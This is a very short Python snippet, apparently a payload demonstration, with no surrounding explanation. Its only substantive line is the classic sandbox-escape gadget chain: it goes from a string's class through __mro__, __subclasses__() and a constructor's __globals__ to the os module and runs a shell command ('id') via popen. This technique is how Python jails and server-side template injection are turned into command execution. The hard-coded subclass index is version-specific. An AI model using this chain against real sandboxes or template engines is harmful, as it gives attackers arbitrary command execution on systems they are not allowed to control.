import os
abc='123'
print(abc.__class__.__mro__[1].__subclasses__()[174].__init__.__globals__['os'].popen('id').read())